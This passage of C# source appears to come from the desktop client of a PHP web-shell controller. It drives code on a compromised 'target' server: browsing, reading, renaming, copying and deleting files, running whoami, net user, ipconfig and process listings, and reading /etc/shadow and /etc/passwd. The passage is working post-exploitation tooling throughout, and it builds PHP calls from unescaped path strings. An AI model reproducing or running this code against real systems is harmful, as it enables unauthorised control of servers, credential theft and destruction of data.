        /// <param name="e"></param>
        private void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0)
            {
                //replace backslash from the treenode path to a proper forward slash
                string path = tn.FullPath.Replace('\\', '/');

                if (path.Contains(".."))
                {
                    filebrowserGoBack();
                } else {
                    string fullPath = "";
                    if (Hosts[g_SelectedTarget].isWindows)
                    {
                        fullPath = path;
                    } else {
                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                    }
                   
                    //Get Directory Contents PHP code
                    string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[g_SelectedTarget].PHP_Version);

                    //attempts to execute the directoryContents PHP code on the "target"
                    //setup GUI callback to call after request
                    //setup main thread

                    object[] callbackParams = { g_SelectedTarget, tn };
                    startPhpExecutionThread(directoryContentsPHPCode, fileBrowserMouseClickMethod, callbackParams);
                }
            }
        }

        //TODO Cleanup later, find another way to do this or disable the flashing

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (treeViewFileBrowser.Nodes != null 
             && treeViewFileBrowser.Nodes.Count > 0)
            {
                Hosts[g_SelectedTarget].Files.Nodes.Clear();
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            start_FileBrowser();
        }


        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null)
            {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        private string fileBrowserGetFileName()
        {
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string name = fileBrowserGetFileName();
            string phpCode = "@readfile('" + name + "');";

            executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + name);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName = fileBrowserGetFileName();
            string newFileName = CustomForms.RenameFileDialog(fileName, "Renaming File");

            if (newFileName != "")
            {
                //todo abstract
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                startPhpExecutionThread(phpCode);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string path = fileBrowserGetFileName();
            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", "HOLD ON THERE COWBOY", MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes)
            {
                //todo abstract
                string phpCode = "@unlink('" + path + "');";

                startPhpExecutionThread(phpCode);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName = fileBrowserGetFileName();
            string newFileName = CustomForms.RenameFileDialog(fileName, "Copying File");

            if (newFileName != "")
            {
                string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                startPhpExecutionThread(phpCode);
            }
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            bool isWin = Hosts[g_SelectedTarget].isWindows;
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.getTaskListFunction(isWin));
            executePHPCodeDisplayInRichTextBox(phpCode, "Process List");
        }

        //Triggered via MENU_ITEM_CLICK

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_NetUser);
            executePHPCodeDisplayInRichTextBox(phpCode, "User Account");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_NetAccounts);
            executePHPCodeDisplayInRichTextBox(phpCode, "User Accounts");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_Ipconfig);
            executePHPCodeDisplayInRichTextBox(phpCode, "ipconfig");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_Ver);
            executePHPCodeDisplayInRichTextBox(phpCode, "ver");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.posixOS_Whoami);
            executePHPCodeDisplayInRichTextBox(phpCode, "whoami");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.linuxOS_Ifconfig);
            executePHPCodeDisplayInRichTextBox(phpCode, "ifconfig");
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.windowsFS_hostTargets);
            executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_NetworkInterfaces);
            executePHPCodeDisplayInRichTextBox(phpCode, "interfaces");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ProcVersion);
            executePHPCodeDisplayInRichTextBox(phpCode, "version");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_hostTargetsFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_IssueFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "issue.net");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ShadowFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "shadow");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_PasswdFile);
            executePHPCodeDisplayInRichTextBox(phpCode, "passwd");
        }

        #endregion

    }
}
